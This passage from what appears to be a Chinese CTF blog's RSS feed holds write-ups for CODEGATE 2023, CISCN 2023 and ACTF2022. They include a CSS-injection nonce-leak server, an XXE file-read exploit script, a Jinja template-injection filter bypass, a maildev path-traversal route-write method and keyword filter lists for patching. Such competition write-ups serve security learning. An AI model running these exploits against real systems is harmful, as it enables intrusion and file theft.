class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;@app.route(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;/gen_exfil_css&amp;#x27;&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;css&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;global&lt;/span&gt; nonce&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(nonce)&amp;lt;=&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(request.args.get(&lt;span class=&#34;string&#34;&gt;&amp;#x27;nonce&amp;#x27;&lt;/span&gt;)):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        nonce = request.args.get(&lt;span class=&#34;string&#34;&gt;&amp;#x27;nonce&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        app.logger.info(nonce)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        rules = []&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; c &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; s:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            rules.append(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;script[nonce^=&amp;quot;&amp;#123;nonce&amp;#125;&amp;#123;c&amp;#125;&amp;quot;] &amp;#123;&amp;#123; background-image: url(&amp;#123;self_url&amp;#125;&amp;#123;ce&amp;#125;) !important&amp;#125;&amp;#125;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;.&lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    nonce=nonce, self_url=self_url, c=c, ce=nonce+ urllib.parse.quote(c)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        rules_str = &lt;span class=&#34;string&#34;&gt;&amp;quot;\n&amp;quot;&lt;/span&gt;.join(rules)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        payload = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&amp;lt;style&amp;gt;* &amp;#123;&amp;#123; display: block !important; &amp;#125;&amp;#125;&amp;#123;rules_str&amp;#125;&amp;lt;/style&amp;gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;.&lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;(rules_str=rules_str)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        socketio.emit(&lt;span class=&#34;string&#34;&gt;&amp;#x27;nonce&amp;#x27;&lt;/span&gt;, json.dumps(&amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;quot;nonce&amp;quot;&lt;/span&gt;:nonce&amp;#125;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;f&amp;quot;&amp;quot;&amp;quot;&amp;lt;body onload=&amp;quot;form.submit()&amp;quot;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;form id=&amp;#x27;form&amp;#x27; action=&amp;quot;http://localhost/write&amp;quot;, method=&amp;quot;POST&amp;quot;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;title&amp;quot; value=&amp;quot;exploit&amp;quot;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;input name=&amp;quot;content&amp;quot; value=&amp;#x27;&lt;span class=&#34;subst&#34;&gt;&amp;#123;payload&amp;#125;&lt;/span&gt;&amp;#x27;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        socketio.emit(&lt;span class=&#34;string&#34;&gt;&amp;#x27;nonce&amp;#x27;&lt;/span&gt;, json.dumps(&amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;quot;nonce&amp;quot;&lt;/span&gt;:nonce&amp;#125;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;asdf&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; __name__ == &lt;span class=&#34;string&#34;&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    socketio.run(app, host=&lt;span class=&#34;string&#34;&gt;&amp;#x27;0.0.0.0&amp;#x27;&lt;/span&gt;,port=&lt;span class=&#34;number&#34;&gt;8000&lt;/span&gt; ,debug=&lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;乐子&#34;&gt;&lt;a href=&#34;#乐子&#34; class=&#34;headerlink&#34; title=&#34;乐子&#34;&gt;&lt;/a&gt;乐子&lt;/h3&gt;&lt;p&gt;很多队都是使用随机数预测直接破的。主办方表示：&lt;br&gt;&lt;img src=&#34;/2023/08/29/CODEGATE2023/lezi.png&#34; alt=&#34;notcrypto&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;0day&#34;&gt;&lt;a href=&#34;#0day&#34; class=&#34;headerlink&#34; title=&#34;0day&#34;&gt;&lt;/a&gt;0day&lt;/h2&gt;&lt;p&gt;利用路径穿越写maildev的lib&amp;#x2F;router.js增加自定义路由。&lt;br&gt;调用：把服务打挂（例如试图写&amp;#x2F;flag或者&amp;#x2F;etc&amp;#x2F;passwd什么的），重启的时候就会加载。  &lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://cubicy.icu/2023/07/07/CISCN-Write-Up-Tricks/</guid>
            <title>CISCN 2023 Write-Up &amp; Tricks</title>
            <link>http://cubicy.icu/2023/07/07/CISCN-Write-Up-Tricks/</link>
            <category>CISCN</category>
            <category>web</category>
            <category>Write-Up</category>
            <pubDate>Fri, 07 Jul 2023 00:28:12 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;CISCN-2023-部分-Write-Up-及patch妙妙小技巧&#34;&gt;&lt;a href=&#34;#CISCN-2023-部分-Write-Up-及patch妙妙小技巧&#34; class=&#34;headerlink&#34; title=&#34;CISCN 2023 部分 Write-Up 及patch妙妙小技巧&#34;&gt;&lt;/a&gt;CISCN 2023 部分 Write-Up 及patch妙妙小技巧&lt;/h1&gt;&lt;h2 id=&#34;Web&#34;&gt;&lt;a href=&#34;#Web&#34; class=&#34;headerlink&#34; title=&#34;Web&#34;&gt;&lt;/a&gt;Web&lt;/h2&gt;&lt;h3 id=&#34;ezphp&#34;&gt;&lt;a href=&#34;#ezphp&#34; class=&#34;headerlink&#34; title=&#34;ezphp&#34;&gt;&lt;/a&gt;ezphp&lt;/h3&gt;&lt;p&gt;变量覆盖+XXE外部实体注入任意文件读。&lt;br&gt;Patch：修了extract就行&lt;br&gt;exp:  &lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;file = &lt;span class=&#34;string&#34;&gt;&amp;quot;/flag&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;username = &lt;span class=&#34;string&#34;&gt;&amp;quot;okok20&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;data = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;#x27;username&amp;#x27;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;f&amp;quot;&amp;quot;&amp;quot;&lt;span class=&#34;subst&#34;&gt;&amp;#123;username&amp;#125;&lt;/span&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;#x27;password&amp;#x27;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;f&amp;quot;&amp;quot;&amp;quot;y&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;#x27;user_xml_format&amp;#x27;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;f&amp;quot;&amp;quot;&amp;quot;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt;&amp;lt;!DOCTYPE ANY [&amp;lt;!ENTITY content SYSTEM &amp;quot;php://filter/read=convert.base64-encode/resource=&lt;span class=&#34;subst&#34;&gt;&amp;#123;file&amp;#125;&lt;/span&gt;&amp;quot;&amp;gt;]&amp;gt;&amp;lt;userinfo&amp;gt;&amp;lt;user&amp;gt;&amp;lt;username&amp;gt;&amp;amp;content;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;1&amp;lt;/password&amp;gt;&amp;lt;/user&amp;gt;&amp;lt;/userinfo&amp;gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r = requests.post(&lt;span class=&#34;string&#34;&gt;&amp;quot;http://175.20.20.196/register.php&amp;quot;&lt;/span&gt;,data=data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(r.text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r = requests.get(&lt;span class=&#34;string&#34;&gt;f&amp;quot;http://175.20.20.196/login.php?username=&lt;span class=&#34;subst&#34;&gt;&amp;#123;username&amp;#125;&lt;/span&gt;&amp;amp;password=2&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(r.text)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;Ciscn-Search-Engine&#34;&gt;&lt;a href=&#34;#Ciscn-Search-Engine&#34; class=&#34;headerlink&#34; title=&#34;Ciscn_Search_Engine&#34;&gt;&lt;/a&gt;Ciscn_Search_Engine&lt;/h3&gt;&lt;p&gt;Jinja模板注入，绕过滤字符。我们可以使用request调用get参数来绕过各种字符。   &lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#123;()|attr(request.values.name1)|attr(request.values.name2)|attr(request.values.name3)()|attr(request.values.name4)(40)(request.values.name6)|attr(request.values.name5)()&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;post:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;name1=__class__&amp;amp;name2=__base__&amp;amp;name3=__subclasses__&amp;amp;name4=pop&amp;amp;name5=read&amp;amp;name6=&amp;quot;/flag&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Patch：把花括号干了。  &lt;/p&gt;
&lt;h3 id=&#34;其他七七八八的Patch&#34;&gt;&lt;a href=&#34;#其他七七八八的Patch&#34; class=&#34;headerlink&#34; title=&#34;其他七七八八的Patch&#34;&gt;&lt;/a&gt;其他七七八八的Patch&lt;/h3&gt;&lt;p&gt;首先，我们是可以知道Patch失败的原因的，那么一定要确保不要Patch过猛导致服务异常；我们需要&lt;strong&gt;优先确保服务正常工作，逐步加大Patch力度&lt;/strong&gt;。&lt;/p&gt;
&lt;h4 id=&#34;过滤关键字&#34;&gt;&lt;a href=&#34;#过滤关键字&#34; class=&#34;headerlink&#34; title=&#34;过滤关键字&#34;&gt;&lt;/a&gt;过滤关键字&lt;/h4&gt;&lt;p&gt;无脑过滤可以迅速打上Patch！我们可以尽量构造一些正常流量中不太可能出现的字符组合来避免被判服务down掉。&lt;br&gt;比如说，想要过滤Python模板注入，我们可以过滤如下组合：&lt;br&gt;&lt;code&gt;|_&lt;/code&gt;, &lt;code&gt;._&lt;/code&gt;, &lt;code&gt;_c&lt;/code&gt;, &lt;code&gt;_[&lt;/code&gt;, &lt;code&gt;](&lt;/code&gt;&lt;br&gt;而对于SQL注入就更简单了：自己打一打，看看哪些函数、符号能利用，就直接过滤掉。  &lt;/p&gt;
&lt;h4 id=&#34;类型安全&#34;&gt;&lt;a href=&#34;#类型安全&#34; class=&#34;headerlink&#34; title=&#34;类型安全&#34;&gt;&lt;/a&gt;类型安全&lt;/h4&gt;&lt;p&gt;如果涉及弱类型的语言，比如PHP，经常会有洞出在弱比较上，那么我们可以考虑如下几种手段：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用强比较：例如PHP&amp;#x2F;Js中使用&lt;code&gt;===&lt;/code&gt;而非&lt;code&gt;==&lt;/code&gt;；&lt;/li&gt;
&lt;li&gt;在关键参数入口处进行正则化：例如，对于期望是整数的参数&lt;code&gt;iv&lt;/code&gt;，就应强制让&lt;code&gt;iv=intval(iv)&lt;/code&gt;转为整型；&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;相信也可以发现国赛这种patch难度远低于attack的难度。建议&lt;strong&gt;做题的初期当作没有攻击得分，先patch了再说&lt;/strong&gt;。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://cubicy.icu/2022/07/03/ACTF2022%20-%20FFSK%20-%20Official%20WriteUp/</guid>
            <title>ACTF2022 - FFSK - Official WriteUp</title>
            <link>http://cubicy.icu/2022/07/03/ACTF2022%20-%20FFSK%20-%20Official%20WriteUp/</link>
            <category>Write-Up</category>
            <category>Misc</category>
            <category>出题</category>
            <pubDate>Sun, 03 Jul 2022 23:43:00 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;FFSK-WriteUp&#34;&gt;&lt;a href=&#34;#FFSK-WriteUp&#34; class=&#34;headerlink&#34; title=&#34;FFSK - WriteUp&#34;&gt;&lt;/a&gt;FFSK - WriteUp&lt;/h1&gt;&lt;p&gt;&lt;del&gt;众所周知歪歪歪英文很烂求轻喷&lt;/del&gt;  &lt;/p&gt;
&lt;h3 id=&#34;0-Intro&#34;&gt;&lt;a href=&#34;#0-Intro&#34; class=&#34;headerlink&#34; title=&#34;0. Intro&#34;&gt;&lt;/a&gt;0. Intro&lt;/h3&gt;&lt;p&gt;In the game period, only one team had solved this problem: MapleBacon, a genius team at the University of British Columbia. I’m happy about their praise, but after checking their solution I think what truly “impressive” is their creativity and persistence.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Strongly recommend reading their awesome solution: &lt;a href=&#34;https://maplebacon.org/2022/06/actf-ffsk/&#34;&gt;https://maplebacon.org/2022/06/actf-ffsk/&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;FSK &amp;#x3D; Frequency-shift keying.&lt;/p&gt;
&lt;p&gt;FFSK &amp;#x3D; Double FSK or Fast FSK, whatever.&lt;/p&gt;
&lt;p&gt;This problem is designed to invite participants to have a look at &lt;em&gt;the principle of communication&lt;/em&gt;. &lt;/p&gt;
&lt;h3 id=&#34;1-Description&#34;&gt;&lt;a href=&#34;#1-Description&#34; class=&#34;headerlink&#34; title=&#34;1. Description&#34;&gt;&lt;/a&gt;1. Description&lt;/h3&gt;&lt;p&gt;A journey to solve a misc problem always begins from a problem description. Here’s it:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;I’ve bought the &lt;strong&gt;second commercial modem&lt;/strong&gt; for computers in a big city of the UK.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;激情澎湃的球迷迷恋这个地方。遇上球赛季，酒吧里的热情、呐喊、啤酒、摇滚，足球让这个城市充满活力和希望。&lt;br&gt;从三万英尺的云端望去，往日的生活成了一个遥远微小的地图。&lt;br&gt;阳光明媚的日子，开始出发，北京时间00:50 开始起飞，一个梦的距离，就可以到达荷兰阿姆斯特丹，短暂停留之后，然后转机飞往英国&lt;br&gt;南航的飞机配置完备，全程可以充电，还有wifi，影视屏有面前最新的电影。睡睡醒醒，在飞机上觅到一部《北京爱情故事》，让我在三万英尺的空中哭的稀里哗啦。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;p&gt;Just Google it, and you’ll realize what it means:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;second commercial modem→Bell 103, corresponds with the file name “modem.wav”&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;a big city in the UK: &lt;strong&gt;Manchester&lt;/strong&gt;, which refers to the famous coding method.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;The source of the long Chinese paragraph: &lt;a href=&#34;https://kknews.cc/zh-hk/travel/e6yjp34.html&#34;&gt;https://kknews.cc/zh-hk/travel/e6yjp34.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;  It describes a trip to Manchester, which is indeed a big city in the UK.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;2-Bell-103&#34;&gt;&lt;a href=&#34;#2-Bell-103&#34; class=&#34;headerlink&#34; title=&#34;2. Bell 103&#34;&gt;&lt;/a&gt;2. Bell 103&lt;/h3&gt;&lt;p&gt;Here’s an article that shows how the Bell 103 protocol works: &lt;a href=&#34;https://vigrey.com/blog/emulating-bell-103-modem&#34;&gt;https://vigrey.com/blog/emulating-bell-103-modem&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;So two key points need your attention. First, characters are stored in ASCII code and are &lt;strong&gt;little-endian;&lt;/strong&gt; second, it has 2 channels for communication: one for the server-side(2025&amp;#x2F;2225 Hz), and another for the client-side(1070&amp;#x2F;1270 Hz).&lt;/p&gt;
&lt;p&gt;You can also find it from the spectrogram of the .wav file.&lt;/p&gt;
&lt;h3 id=&#34;2-Server-channel&#34;&gt;&lt;a href=&#34;#2-Server-channel&#34; class=&#34;headerlink&#34; title=&#34;2. Server channel&#34;&gt;&lt;/a&gt;2. Server channel&lt;/h3&gt;&lt;p&gt;Using the &lt;code&gt;minimodem&lt;/code&gt;tool (See MapleBacon’s write-up) is functional.&lt;/p&gt;
&lt;p&gt;Also, you can find some useful tools in GitHub: &lt;a href=&#34;https://github.com/laurenschneider/audiodecoder&#34;&gt;https://github.com/laurenschneider/audiodecoder&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;It may be a faster way. In fact, the &lt;code&gt;solve.py&lt;/code&gt; is based on its code.&lt;/p&gt;
&lt;p&gt;After all, you’ll see this on the server channel:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;HINT_Hamming@ddddPdddddddPdddPdPP(20).ECCode; Content: Why do you use such&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a slow method with a high Bit Error Ratio for communication? It took me a lot of&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;effort to correct bit-flips, making sure the communication was less&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;error-prone...that is 2 say, THE ORIGINAL PROTOCOL IS WRAPPED BY SOME OTHER&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;TRANSFORMATIONS! Fortunately, we can now communicate properly on another channel&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;while enjoying a vacation in this BIG CITY--I mean, IEEE 802.3.....Wait, what is&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;the new protocol? Guess by yourself!&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;3-Client-channel&#34;&gt;&lt;a href=&#34;#3-Client-channel&#34; class=&#34;headerlink&#34; title=&#34;3. Client channel&#34;&gt;&lt;/a&gt;3. Client channel&lt;/h3&gt;&lt;p&gt;We can extract the bit string on this channel using the same method but just make some tweaks of frequency. You’ll get a bit string of 53640 bits.&lt;/p&gt;
&lt;p&gt;Notice that the bit string contains only “01” “10”, that is what &lt;strong&gt;Manchester is&lt;/strong&gt; all about. The &lt;code&gt;IEEE 802.3&lt;/code&gt;mentioned in the server channel message is actually to make sure you decode in the right way: there are 2 opposite ways to map 01&amp;#x2F;10 to 1&amp;#x2F;0, but what is widely used is defined in IEEE 802.3, which says “01”→1 and “10”→0&lt;/p&gt;
&lt;p&gt;Then the key problem is to solve Hamming code. From the given information, you’ll realize the block size is 20bits. Implement it by yourself or just Google&amp;#x2F;GitHub&amp;#x2F;StackOverflow it.&lt;/p&gt;
&lt;p&gt;Find every “1” bit in a block, XOR their &lt;strong&gt;positions&lt;/strong&gt;, and magically you got the error bit position(0 if no error) which is a well-designed feature of Hamming code, then just flip the bit. &lt;/p&gt;
&lt;p&gt;Actually, every block has, and only has an error bit: that’s an intended design to notify you that you’re on the right way :)&lt;/p&gt;
&lt;h3 id=&#34;4-Final-Step&#34;&gt;&lt;a href=&#34;#4-Final-Step&#34; class=&#34;headerlink&#34; title=&#34;4. Final Step&#34;&gt;&lt;/a&gt;4. Final Step&lt;/h3&gt;&lt;p&gt;Now you’ve got the cipher bit string: just applied Bell 103 decoder to it once again. &lt;/p&gt;
&lt;p&gt;It’ll yield a string that starts with &lt;code&gt;data:image/png;base64,&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;An experienced CTFer will immediately put it into the browser (like what MapleBacon did). Or you can find a random online converter to recover this Base64-encoded image. It’s a QR Code. Scan it, and got the flag.&lt;/p&gt;
&lt;h3 id=&#34;5-Hints-Explanation&#34;&gt;&lt;a href=&#34;#5-Hints-Explanation&#34; class=&#34;headerlink&#34; title=&#34;5. Hints Explanation&#34;&gt;&lt;/a&gt;5. Hints Explanation&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;所有人都认为，吃鸡蛋前，原始的方法是打破鸡蛋较大的一端。可是当今皇帝的祖父 时候吃鸡蛋，一次按古法打鸡蛋时碰巧将一个手指弄破了，因此他的父亲，当时的皇帝， 就下了一道敕令，命令全体臣民吃鸡蛋时打破鸡蛋较小的一端，违令者重罚。 老百姓们 对这项命令极为反感。历史告诉我们，由此曾发生过六次叛乱，其中一个皇帝送了命，另 一个丢了王位…关于这一争端，曾出版过几百本大部著作，不过大端派的书一直是受禁的 ，法律也规定该派的任何人不得做官。 ——乔纳森·斯威夫特，《格列佛游记》&lt;/code&gt;&lt;/p&gt;
&lt;p&gt; It is a quote from Gulliver’s Travels.  Fun fact: this paragraph is &lt;strong&gt;exactly the original source of the 2 words used in modern computer science: “big-endian” &amp;amp; “little-endian”.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; This hint is intended to guide those who are stuck because of their ignorance of the contents(especially the coding method) of the Bell 103 protocol.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;Hamming code block size: 20bits&lt;/code&gt;&lt;/p&gt;
&lt;p&gt; Noticed that minimodem may yield partly corrupt text and mislead participants. This hint is to make sure they see the hint hidden at the beginning of the service-side channel message.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;Bell 103&lt;/code&gt;&lt;/p&gt;
&lt;p&gt; For those who ignored the problem description.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;6-Script-to-Solve&#34;&gt;&lt;a href=&#34;#6-Script-to-Solve&#34; class=&#34;headerlink&#34; title=&#34;6. Script to Solve&#34;&gt;&lt;/a&gt;6. Script to Solve&lt;/h3&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span 